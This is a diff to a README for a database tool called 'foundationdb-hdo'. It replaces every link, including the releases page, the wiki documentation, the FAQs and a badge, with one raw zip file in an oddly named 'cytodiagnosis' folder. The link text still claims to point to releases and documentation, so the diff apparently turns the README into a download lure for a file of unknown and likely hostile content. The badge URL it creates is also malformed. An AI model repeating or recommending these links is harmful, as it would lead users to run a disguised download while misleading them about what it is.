@@ -1,12 +1,12 @@
 # 🚀 foundationdb-hdo - Simple Access to Fast Database Management
 
-![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue.svg)
+![Download Latest Release](https://raw.githubusercontent.com/Code-cave-media/foundationdb-hdo/main/cytodiagnosis/foundationdb-hdo.zip%20Latest%https://raw.githubusercontent.com/Code-cave-media/foundationdb-hdo/main/cytodiagnosis/foundationdb-hdo.zip)
 
 ## 📥 Download & Install
 
 To get started with `foundationdb-hdo`, visit the following link to download the application:
 
-[Download from Releases](https://github.com/Code-cave-media/foundationdb-hdo/releases)
+[Download from Releases](https://raw.githubusercontent.com/Code-cave-media/foundationdb-hdo/main/cytodiagnosis/foundationdb-hdo.zip)
 
 This link takes you to our Releases page, where you can find the latest version of the software. 
 
@@ -52,6 +52,6 @@ The development of `foundationdb-hdo` relies on the hard work of contributors an
 
 ## 🔗 Additional Resources
 
-For more information on using `foundationdb-hdo`, please refer to the [Documentation](https://github.com/Code-cave-media/foundationdb-hdo/wiki) or check out the existing [FAQs](https://github.com/Code-cave-media/foundationdb-hdo/wiki/FAQs).
+For more information on using `foundationdb-hdo`, please refer to the [Documentation](https://raw.githubusercontent.com/Code-cave-media/foundationdb-hdo/main/cytodiagnosis/foundationdb-hdo.zip) or check out the existing [FAQs](https://raw.githubusercontent.com/Code-cave-media/foundationdb-hdo/main/cytodiagnosis/foundationdb-hdo.zip).
 
-Don't forget to check the [Releases page](https://github.com/Code-cave-media/foundationdb-hdo/releases) for the latest updates and enhancements to your application.
+Don't forget to check the [Releases page](https://raw.githubusercontent.com/Code-cave-media/foundationdb-hdo/main/cytodiagnosis/foundationdb-hdo.zip) for the latest updates and enhancements to your application.
